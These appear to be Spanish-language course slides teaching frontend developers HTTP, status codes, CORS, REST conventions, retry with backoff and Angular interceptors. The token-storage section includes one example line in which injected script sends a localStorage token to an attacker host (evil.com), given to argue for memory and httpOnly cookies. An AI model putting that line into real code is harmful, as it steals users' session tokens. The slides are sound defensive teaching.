Bloque 1

HTTP — El Protocolo

15 minutos

Hypertext Transfer Protocol — RFC 9110 (2022)

El modelo mental incorrecto

❌ Lo que crees que pasa

fetch(url) → JSON ✨

Magia. No sé qué pasa en medio. Si falla, googleo el error.

✅ Lo que realmente pasa

1. DNS Resolution (url → IP)
2. TCP Connection (3-way handshake)
3. TLS Handshake (si es HTTPS)
4. HTTP Request (method + headers + body)
5. Server Processing
6. HTTP Response (status + headers + body)
7. Browser parses body

Cada paso puede fallar de forma diferente. Si no entiendes la cadena, debuggeas a ciegas.

¿Qué es HTTP?

  • Protocolo de aplicación — capa 7 del modelo OSI
  • Request/Response — el cliente pide, el server responde
  • Stateless — cada request es independiente, no hay "sesión" a nivel protocolo
  • Text-based (HTTP/1.1) — puedes leerlo en raw
  • Versiones: HTTP/1.1 (1997), HTTP/2 (2015), HTTP/3 (2022, sobre QUIC/UDP)

HTTP/2 y HTTP/3 son binarios y multiplexados, pero la semántica (methods, headers, status codes) es la MISMA. Lo que aprendes hoy aplica a todas las versiones.

DevTools Network Tab — Tu mejor amigo

  • Headers tab: Qué enviaste (request) y qué recibiste (response)
  • Timing tab: TTFB (Time To First Byte), Content Download, DNS, TLS
  • Preview tab: Body parseado (JSON formateado)
  • Initiator tab: Qué línea de código disparó la request
  • Filtro XHR/Fetch: Para no ver ruido (imágenes, CSS, etc.)

💡 Si no usas Network tab, estás adivinando. Punto.

Pro tip: Click derecho en una request → "Copy as cURL" te da el comando exacto para reproducirla en terminal.

Anatomía de un HTTP Request

POST /api/products HTTP/1.1          ← Request Line (method + path + version)
Host: localhost:3000                  ← Header obligatorio
Content-Type: application/json        ← Qué formato tiene el body
Authorization: Bearer eyJhbGciOi...   ← Credencial de autenticación
Accept: application/json              ← Qué formato quiero de vuelta
Content-Length: 42                    ← Tamaño del body en bytes

{                                     ← Body (payload)
  "name": "Keyboard",
  "price": 149.99
}

Angular HttpClient construye todo esto por ti. Pero cuando algo falla, necesitas saber leer el raw request en Network tab para entender QUÉ se envió realmente.

Anatomía de un HTTP Response

HTTP/1.1 201 Created                 ← Status Line (version + code + reason)
Content-Type: application/json        ← Formato del body
Location: /api/products/11            ← URL del recurso creado (convención REST)
X-Total-Count: 11                     ← Header custom (paginación)
Cache-Control: no-cache               ← Instrucciones de cache
ETag: "abc123"                        ← Fingerprint del recurso (cache validation)

{                                     ← Body
  "id": 11,
  "name": "Keyboard",
  "price": 149.99
}

El body NO es lo único que importa. Los headers te dan: total de items (paginación), URLs de recursos creados, instrucciones de cache, rate limit info, y más. Si solo lees el body, pierdes metadata crucial.

HTTP Methods — La tabla completa

MethodPropósitoBodySafeIdempotenteCacheable

HEADComo GET pero sin bodyNo✅✅✅
POSTCrear recurso / acciónSí❌❌❌

Idempotencia — ¿Por qué te importa?

✅ Idempotente = Safe de reintentar

  • GET /products — leer 10 veces = mismo resultado
  • PUT /products/1 — enviar 10 veces = mismo estado final
  • DELETE /products/1 — borrar algo ya borrado = OK (404 o 204)

→ Tu retry interceptor puede reintentar estos sin miedo

❌ NO idempotente = Peligro al reintentar

  • POST /orders — enviar 2 veces = 2 órdenes creadas
  • POST /payments — reintentar = cobrar doble
  • Double-click en "Comprar" = problema real

→ NUNCA reintentar POST automáticamente

Caso real: Usuario con internet lento. El POST tarda. El usuario hace click de nuevo. Sin protección = 2 órdenes. Solución: disable button + idempotency key en el header.

🔒 CORS — Cross-Origin Resource Sharing

El error que todos googlean y nadie entiende

  • Same-Origin Policy: El browser BLOQUEA requests a un origen diferente al tuyo
  • Origen = protocolo + host + puerto (los 3 deben coincidir)
  • CORS = Mecanismo donde el SERVER dice "acepto requests de este origen"
  • Es SEGURIDAD — protege a tus usuarios de scripts maliciosos
Desde http://localhost:4200¿Same Origin?¿Por qué?
http://localhost:4200/api/data✅ SíMismo protocolo, host, puerto
http://localhost:3000/products❌ NoPuerto diferente (3000 ≠ 4200)
https://localhost:4200/api❌ NoProtocolo diferente (https ≠ http)
https://api.github.com/users❌ NoHost diferente

CORS — Simple Request vs Preflight

Simple Request (directo)

El browser envía la request directamente:

  • Methods: GET, HEAD, POST
  • Content-Type: text/plain, multipart/form-data, application/x-www-form-urlencoded
  • Sin custom headers
Browser → Server: GET /api/data
Server → Browser: 200 + CORS headers

Preflight (OPTIONS primero)

El browser pregunta ANTES:

  • Methods: PUT, PATCH, DELETE
  • Content-Type: application/json
  • Custom headers (Authorization, X-*)
Browser → Server: OPTIONS /api/data
Server → Browser: 204 + allowed methods
Browser → Server: PUT /api/data (real)
Server → Browser: 200

Implicación: Cada PUT/PATCH/DELETE con JSON genera 2 requests en Network tab. La primera (OPTIONS) es invisible para tu código pero consume tiempo.

CORS — Headers del Server y "Soluciones"

Headers que el SERVER debe enviar:

Access-Control-Allow-Origin: http://localhost:4200  // o * para cualquiera
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400  // Cache del preflight por 24h (evita OPTIONS repetidos)

❌ "Soluciones" incorrectas

  • mode: "no-cors" → opaque response, no puedes leer nada
  • Extensión de browser → solo para ti, no para usuarios
  • Proxy en dev → no funciona en producción
  • Desactivar seguridad del browser → nunca

✅ Solución real

  • El BACKEND configura los headers CORS
  • En desarrollo: json-server ya los incluye
  • En producción: configurar en el API gateway/server
  • Tú como frontend NO puedes "arreglar" CORS

Status Codes

Tu contrato con el backend

10 minutos

Los 5 Rangos

RangoCategoríaSignificado¿Quién tiene la culpa?
1xxInformationalRequest recibida, procesandoNadie (raro verlos)
2xxSuccessRequest exitosaNadie — todo bien ✅
3xxRedirectionEl recurso se movióNadie — el browser sigue automáticamente
4xxClient ErrorLa request está malTÚ (el frontend/usuario) 🫵
5xxServer ErrorEl server fallóELLOS (el backend) 💥

Regla de oro: El status code es un CONTRATO entre frontend y backend. Si el backend devuelve 200 OK con {"error": "not found"} en el body, el contrato está ROTO. Eso rompe interceptors, retry logic, cache, y cualquier herramienta que dependa del protocolo.

2xx — Success (todo salió bien)

CodeNombreCuándo se usaAcción en Frontend
200OKGET exitoso, PUT/PATCH exitosoMostrar datos / confirmar update
201CreatedPOST creó un recurso nuevoConfirmar creación, leer Location header
204No ContentDELETE exitoso, acción sin response bodyConfirmar acción, NO intentar parsear body
 
// Ejemplo: POST retorna 201 + Location header
this.http.post('/api/products', newProduct, { observe: 'response' })
  .subscribe(res => {
    console.log(res.status);                    // 201
    console.log(res.headers.get('Location'));    // /api/products/11
    console.log(res.body);                      // { id: 11, name: ... }
  });

4xx — Client Errors (TÚ la cagaste)

CodeNombreSignificadoAcción en Frontend
400Bad RequestRequest malformada (JSON inválido, params faltantes)Mostrar error de formato
401UnauthorizedNo autenticado (token falta o expiró)Refresh token → retry, o redirect a login
403ForbiddenAutenticado pero SIN permisosMensaje "no tienes acceso". NO reintentar.
404Not FoundEl recurso no existeMostrar estado vacío / "no encontrado"
409ConflictConflicto de estado (ej: recurso ya existe)Mostrar conflicto, ofrecer resolver
422UnprocessableBody es JSON válido pero datos no pasan validaciónMostrar errores de validación en el form
429Too Many RequestsRate limited — demasiadas requestsLeer Retry-After header, esperar, reintentar

401 vs 403: 401 = "no sé quién eres" (puede resolverse con login/refresh). 403 = "sé quién eres pero NO tienes permiso" (reintentar NO ayuda).

5xx — Server Errors (ELLOS la cagaron)

CodeNombreSignificadoAcción en Frontend
500Internal Server ErrorBug en el backend (excepción no manejada)Log + mensaje genérico "intenta más tarde"
502Bad GatewayProxy/LB no puede conectar al backendRetry con backoff (puede ser transitorio)
503Service UnavailableServer sobrecargado o en mantenimientoRetry con exponential backoff
504Gateway TimeoutBackend no respondió a tiempoRetry con backoff

Diferencia clave: 4xx = reintentar NO ayuda (el request está mal). 5xx = reintentar PUEDE ayudar (el server puede recuperarse). Tu retry interceptor debe distinguir esto.

Error Handling — Anti-Pattern vs Pattern

❌ Lo que hace el 90% de frontends

// NO distingue NADA
this.http.get('/api/data').subscribe({
  error: (e) => {
    alert("Ocurrió un error");
    // ¿401? ¿403? ¿500? ¿429?
    // No sé. No me importa.
    // El usuario tampoco sabe qué hacer.
  }
});

✅ Lo que deberías hacer

// Interceptor centralizado
catchError((err: HttpErrorResponse) => {
  switch (true) {
    case err.status === 401:
      return refreshAndRetry(req);
    case err.status === 403:
      notify.error('Sin permisos');
      break;
    case err.status === 429:
      return waitRetryAfter(err);
    case err.status >= 500:
      return retryWithBackoff(req);
    default:
      notify.warn(err.error?.detail);
  }
  return throwError(() => err);
})

Interceptors — Pipeline HTTP centralizado

// app.config.ts — Angular 17+ functional interceptors
export const appConfig: ApplicationConfig = {
  providers: [
    provideHttpClient(
      withInterceptors([
        loggingInterceptor,    // 1. Log de cada request/response
        authInterceptor,       // 2. Agregar Bearer token
        retryInterceptor,      // 3. Retry en 503 con backoff
        errorInterceptor,      // 4. Manejo centralizado de errores
      ])
    ),
  ],
};

Orden importa: Se ejecutan en orden para requests (→) y en orden inverso para responses (←). El logging va primero para capturar TODO. El error handler va último para capturar errores de todos los anteriores.

Beneficio: Los componentes NO saben de HTTP errors, tokens, o retry. Solo se suscriben y reciben datos o un error limpio.

Bloque 3

REST

Cómo consumir APIs correctamente

15 minutos

¿Qué es REST? (versión práctica)

  • REpresentational State Transfer — Roy Fielding, 2000
  • NO es un estándar, es un estilo arquitectónico con constraints
  • NO es "URLs bonitas" ni "CRUD con HTTP"

Los 6 constraints de REST:

1. Client-ServerSeparación de responsabilidades
2. StatelessCada request lleva TODO lo necesario (no hay sesión en server)
3. CacheableResponses deben indicar si son cacheables
4. Uniform InterfaceRecursos identificados por URLs, manipulados via representaciones
5. Layered SystemEl cliente no sabe si habla con el server final o un proxy
6. Code on Demand(Opcional) El server puede enviar código ejecutable

Recursos — La base de REST

  • Un recurso es cualquier cosa que puedas nombrar: usuario, producto, orden, sesión
  • Se identifica con una URL (Uniform Resource Locator)
  • Un recurso NO es una tabla de base de datos (puede ser una agregación, un cálculo, etc.)

✅ URLs bien diseñadas

GET    /products           → Colección
GET    /products/123       → Recurso específico
POST   /products           → Crear nuevo
PUT    /products/123       → Reemplazar
PATCH  /products/123       → Modificar parcial
DELETE /products/123       → Eliminar
GET    /products/123/reviews → Sub-recurso
GET    /users/me/orders    → Recurso contextual

❌ URLs mal diseñadas

GET  /getProducts
POST /createProduct
GET  /deleteProduct?id=123
POST /product/update
GET  /getAllProductReviews
POST /doPayment
GET  /api/v1/fetchUserData

Verbos en URLs = no es REST.
La acción la define el HTTP method, no la URL.

Paginación — Cómo consumirla

Offset/Limit (más común)

GET /products?_page=2&_limit=10

Response headers:
  X-Total-Count: 142
  Link: </products?_page=3>; rel="next"

Simple. Problemas: si insertan datos entre páginas, puedes ver duplicados o saltar items.

Cursor-based (más robusto)

GET /products?after=abc123&limit=10

Response:
{
  "data": [...],
  "nextCursor": "def456",
  "hasMore": true
}

Ideal para infinite scroll. No tiene problemas de consistencia.

// Angular — leer total del header
this.http.get<Product[]>('/api/products', {
  params: new HttpParams().set('_page', '1').set('_limit', '10'),
  observe: 'response'  // ← CLAVE: sin esto no tienes acceso a headers
}).pipe(
  map(res => ({
    data: res.body ?? [],
    total: Number(res.headers.get('X-Total-Count'))
  }))
);

Filtrado y Sorting

// Construir query params en Angular
let params = new HttpParams();

// Filtros
params = params.set('status', 'pending');        // ?status=pending
params = params.set('category', 'peripherals');  // &category=peripherals

// Sorting (convención: prefix - para desc)
const sort = '-createdAt';
const isDesc = sort.startsWith('-');
params = params.set('_sort', isDesc ? sort.slice(1) : sort);
params = params.set('_order', isDesc ? 'desc' : 'asc');

// Resultado: GET /tasks?status=pending&category=peripherals&_sort=createdAt&_order=desc
this.http.get<Task[]>('/api/tasks', { params });
  • HttpParams es INMUTABLE — cada .set() retorna nueva instancia (como un string)
  • Convenciones varían por API: json-server usa _sort/_order, otros usan sort=field:desc
  • Siempre lee la documentación de la API para saber qué params acepta

// ETag flow:
// 1. GET /products → Response: ETag: "v1-abc"
// 2. GET /products + Header: If-None-Match: "v1-abc"
//    → Si no cambió: 304 Not Modified (0 bytes body, ultra rápido)
//    → Si cambió: 200 OK + nuevo body + nuevo ETag

En Angular puedes implementar un interceptor de cache, o usar signals + un store que cachee responses.

Retry con Exponential Backoff

export const retryInterceptor: HttpInterceptorFn = (req, next) => {
  // 1. Solo métodos idempotentes (safe de reintentar)
  const idempotent = ['GET', 'PUT', 'DELETE', 'HEAD', 'OPTIONS'];
  if (!idempotent.includes(req.method)) return next(req);

  return next(req).pipe(
    retry({
      count: 3,  // Máximo 3 reintentos
      delay: (error, retryCount) => {
        // 2. Solo reintentar errores de servidor/red
        const retryable = [503, 502, 504, 0]; // 0 = network error
        if (!retryable.includes(error.status)) throw error; // 4xx → no reintentar

        // 3. Exponential backoff: 1s, 2s, 4s
        const ms = Math.pow(2, retryCount - 1) * 1000;
        console.warn(`🔄 Retry #${retryCount} in ${ms}ms`);
        return timer(ms);
      }
    })
  );
};
  • ¿Por qué backoff? Si el server está sobrecargado y 1000 clientes reintentan al mismo tiempo = thundering herd = peor
  • ¿Por qué solo idempotentes? Reintentar POST puede crear duplicados
  • ¿Por qué no 4xx? Si tu request está mal, enviarla de nuevo no la arregla

Autenticación en APIs REST

El flujo completo desde el frontend

1. POST /auth/login { email, password }
   → 200 { accessToken: "eyJ...", expiresIn: 900 }

2. GET /api/products + Header: Authorization: Bearer eyJ...
   → 200 [products...]

3. (15 min después, token expiró)
   GET /api/products + Header: Authorization: Bearer eyJ...(expirado)
   → 401 Unauthorized

4. (Error interceptor detecta 401)
   POST /auth/refresh (con httpOnly cookie)
   → 200 { accessToken: "nuevo-eyJ..." }

5. (Retry automático con nuevo token)
   GET /api/products + Header: Authorization: Bearer nuevo-eyJ...
   → 200 [products...]

6. (Si refresh también falla)
   → Logout automático → Redirect a login

Todo esto pasa en el interceptor. El componente NO se entera del 401 ni del refresh.

⚠️ Dónde guardar tokens

❌ localStorage / sessionStorage

  • Accesible por CUALQUIER JavaScript en la página
  • Si hay un XSS (script inyectado), el atacante roba el token
  • Persiste entre tabs y recargas (localStorage)
  • No se envía automáticamente al server
// Un atacante con XSS puede hacer:
fetch('https://evil.com/steal?token=' +
  localStorage.getItem('token'));

✅ Memoria + httpOnly cookie

  • Access token: en memoria (variable/signal) — se pierde al cerrar tab
  • Refresh token: en httpOnly cookie — JavaScript NO puede leerlo
  • El browser envía la cookie automáticamente
  • XSS no puede robar lo que no puede leer
// En Angular con signals:
private readonly token = signal<string | null>(null);
// XSS no puede acceder a esto directamente

RFC 9457 — Problem Details

El estándar para error responses en APIs

// En vez de inventar tu propio formato de error...
// Usa el estándar:
{
  "type": "https://api.myapp.com/errors/validation",
  "title": "Validation Error",
  "status": 422,
  "detail": "The field 'price' must be greater than 0",
  "instance": "/api/products",
  "errors": [
    { "field": "price", "message": "Must be > 0" },
    { "field": "name", "message": "Required" }
  ]
}
  • type: URI que identifica el tipo de error (documentación)
  • title: Resumen legible por humanos
  • status: HTTP status code (redundante pero útil cuando se loggea solo el body)
  • detail: Explicación específica de esta instancia del error
  • instance: URI del recurso que causó el error
  • Puedes agregar campos custom (como errors[] para validación)

Richardson Maturity Model

¿Qué tan REST es tu API?

NivelNombreCaracterísticasEjemplo
0The Swamp of POXUn endpoint, todo POST, RPC-stylePOST /api { action: "getUser", id: 1 }
1ResourcesURLs por recurso, pero solo POST/GETPOST /api/users/1/delete
2HTTP VerbsUsa methods correctamente + status codesDELETE /users/1 → 204
3HATEOASResponses incluyen links a acciones posibles{ "links": [{ "rel": "cancel", "href": "/orders/1/cancel" }] }

La mayoría de APIs en producción están en Nivel 2. Nivel 3 (HATEOAS) es raro en la práctica. Lo importante: si tu API no está al menos en Nivel 2, no es REST — es RPC con URLs bonitas.

Demo — Auth Interceptor (código real)

export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const authService = inject(AuthService);
  const token = authService.getToken();

  // No agregar token a endpoints de auth
  if (!token || req.url.includes('/auth/')) {
    return next(req);
  }

  // Clonar request (son INMUTABLES) y agregar header
  const authReq = req.clone({
    setHeaders: { Authorization: `Bearer ${token}` }
  });

  return next(authReq);
};

Punto clave: El componente hace this.http.get('/products') sin saber nada de tokens. El interceptor se encarga. Separación de responsabilidades.

✅ Checklist del Frontend que entiende HTTP

  • ✅ Usa el verbo correcto (no todo es POST/GET)
  • ✅ Maneja status codes por rango (no todo es catch → alert)
  • ✅ Entiende CORS (no googlea "disable CORS chrome")
  • ✅ Implementa retry con backoff (no spamea el server en 503)
  • ✅ Lee headers de response (no solo el body)
  • ✅ Guarda tokens de forma segura (no localStorage)
  • ✅ Centraliza lógica HTTP en interceptors (DRY)
  • ✅ Construye query params correctamente (HttpParams/URLSearchParams)
  • ✅ Distingue PUT vs PATCH (reemplazo completo vs parcial)
  • ✅ Entiende idempotencia (qué es safe de reintentar)
